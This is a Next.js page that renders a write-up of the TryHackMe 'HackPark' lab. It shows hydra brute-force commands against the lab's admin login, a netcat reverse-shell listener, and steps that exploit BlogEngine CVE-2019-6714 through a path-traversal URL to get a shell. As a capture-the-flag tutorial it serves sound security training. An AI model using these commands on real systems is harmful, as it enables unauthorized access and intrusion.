import Head from "next/head";
import Link from "next/link";
import { CSSProperties } from "react";
import Layout from "../../components/layout";
import { CopyBlock, github } from "react-code-blocks";

const centerStyle: CSSProperties = {
  textAlign: "center",
};

export default function FirstPost() {
  return (
    <Layout home={undefined}>
      <Head>
        <title>Writeups</title>
      </Head>
      <h1 style={centerStyle}>TryHackme HackPark Writeup</h1>
      <p>
        This is a write up for the tryhackme room &quotHackPark&quot. The first
        thing you should do is start the room&apos;s VM. I prefer to connect
        through OpenVPN. This allows you to connect natively through your
        computer&apos;s browser. This also allows you to curate your own tools
        on your computer which can be used for future tasks.
        <br />
        <br />
        If we navigate to the home page of our server, we are greeted by
        pennywise. When we press the hamburger icon, we get several options.
        With one of them being a login. Let&apos;s try that since our first task
        is using hydra to brute force logins. We are redirected to
        http://10.10.93.133/Account/login.aspx?ReturnURL=/admin/ We can probably
        assume that the username will be admin. Actually, the first hint tells
        us that the username is admin. This makes bruteforcing exponentially
        quicker. This just saves us time, and doesn&apos;t necessarily make it
        any &quoteasier&quot besides the time saving Let&apos;s log in with
        dummy credentials in order to capture all the arguments needed to brute
        force the credentials. If on firefox or chrome, enter CTRL + SHIFT + I
        before loggin in and go to the network tab. We notice 5 arguments:
        <CopyBlock
          text="__VIEWSTATE, __EVENTVALIDATION, ctl00$MainContent$LoginUser$UserName,
        ctl00$MainContent$LoginUser$Password,
        ctl00$MainContent$LoginUser$LoginButton"
          language="text"
          wrapLines
          theme={github}
        />
        <br />
        <br />
        The first command I tried was:
        <CopyBlock
          text="hydra -l admin -P ~/tools/rockyou.txt 10.10.181.8 http-post-form '/Account/login.aspx?
          ReturnURL=/admin/:ctl00$MainContent$LoginUser$UserName=^USER^
          &ctl00$MainContent$LoginUser$Password=^PASS^:Login failed'"
          language="shell"
          wrapLines
          theme={github}
        />
        <br />
        <br />
        The reason I used this command is because in the past, I&apos;ve only
        supplied the needed arguments for username and password. This
        didn&apos;t end up working, so that means that we should provide all of
        them.
        <br />
        <br />
        Second Attempt:
        <CopyBlock
          text="hydra -l admin -P ~/tools/rockyou.txt 10.10.181.1 http-post-form '/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=*LONGVALUE*
          &__EVENTVALIDATION=*LONGVALUE*
          &ctl00%24MainContent%24LoginUser%24UserName=^USER^
          &ctl00%24MainContent%24LoginUser%24Password=^PASS^
          &ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed'"
          language="shell"
          wrapLines
          theme={github}
        />
        <br />
        <br />
        This also didn&apos;t work! What gives? I was still getting false
        positives. Hydra was saying that all of its attempts were validating
        successfully. Then, I noticed that the arguments have odd characters. I
        decided to URL encode some of the funny characters that may be
        interfering with hydra. Third command:
        <br />
        <br />
        <CopyBlock
          text="hydra -l admin -P ~/tools/rockyou.txt 10.10.93.133 http-post-form '/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=*LONGVALUE*
          &__EVENTVALIDATION=*LONGVALUE*
          &ctl00%24MainContent%24LoginUser%24UserName=^USER^
          &ctl00%24MainContent%24LoginUser%24Password=^PASS^
          &ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed'"
          language="shell"
          wrapLines
          theme={github}
        />
        <br />
        <br />
        Success finally! We got the credentials and we can login to the admin
        portal. Once we log in, we can see that Blog Engine v3.3.6.0 is running.
        We search exploit db, and we see that we have a LFI + RCE vulnerabilty
        with CVE-2019-6714. This script is located in
        <Link href="https://www.exploit-db.com/exploits/46353">exploit db</Link>
        , a site you should get accustomed with. The instructions mention that
        all we need for this to work is to
        <ol>
          <li>Set up a netcast listener command: nc -lvnp 4445</li>
          <li>
            Download the file and edit the method to point to your ip connected
            to the tryhackme vpn.
          </li>
          <li>
            Edit the post. Click on the icon with the open folder to uplooad
            this document. Ensure it is titled PostView.ascx.
          </li>
          <li>Navigate to http://10.10.93.133/?theme=../../App_Data/files</li>
          <li>
            You should have received a connection and now have a reverse shell!
          </li>
        </ol>
        Happy hacking!
      </p>
    </Layout>
  );
}
